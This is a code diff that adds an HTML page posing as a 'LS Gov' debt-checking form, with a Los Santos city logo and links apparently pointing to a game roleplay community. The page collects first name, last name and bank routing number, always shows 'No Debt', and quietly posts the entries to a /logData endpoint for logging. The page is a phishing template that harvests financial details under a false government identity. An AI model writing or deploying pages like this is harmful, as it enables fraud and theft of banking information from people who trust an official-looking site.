@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LS Gov</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+        header {
+            margin-bottom: 20px;
+        }
+        form {
+            display: inline-block;
+            margin-top: 20px;
+        }
+        input {
+            display: block;
+            margin: 10px 0;
+            padding: 8px;
+        }
+        #message {
+            color: green;
+            margin-top: 10px;
+            display: none;
+        }
+        footer {
+            margin-top: 50px;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <img src="https://gov.gta.world/ext/planetstyles/flightdeck/store/City%20of%20los%20santos.png" alt="City of Los Santos">
+</header>
+
+<form id="debtForm">
+    <label for="firstName">First Name:</label>
+    <input type="text" id="firstName" name="firstName" required>
+
+    <label for="lastName">Last Name:</label>
+    <input type="text" id="lastName" name="lastName" required>
+
+    <label for="routingNumber">Routing Number:</label>
+    <input type="text" id="routingNumber" name="routingNumber" required pattern="\d{9,}" title="Routing number must be at least 9 digits">
+
+    <button type="submit">Submit</button>
+</form>
+
+<div id="message">No Debt</div>
+
+<footer>
+    <a href="https://gov.gta.world/viewforum.php?f=464">Join us at Department of Finance</a>
+    <p>LS GOV 2024 &copy; All Rights Reserved</p>
+</footer>
+
+<script>
+    document.getElementById("debtForm").addEventListener("submit", function(event) {
+        event.preventDefault();
+        
+        const firstName = document.getElementById("firstName").value;
+        const lastName = document.getElementById("lastName").value;
+        const routingNumber = document.getElementById("routingNumber").value;
+
+        // Validate the routing number
+        if (routingNumber.length < 9 || isNaN(routingNumber)) {
+            alert("Routing number must be at least 9 digits.");
+            return;
+        }
+
+        // Display message
+        document.getElementById("message").style.display = "block";
+
+        // Log the data into logs.txt (this requires server-side scripting, e.g., PHP or Node.js)
+        // Example code for logging the form data to logs.txt:
+        const data = `First Name: ${firstName}, Last Name: ${lastName}, Routing Number: ${routingNumber}\n`;
+        
+        // Sending data to server (example, adjust based on your backend)
+        fetch('/logData', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ data })
+        });
+    });
+</script>
+
+</body>
+</html>
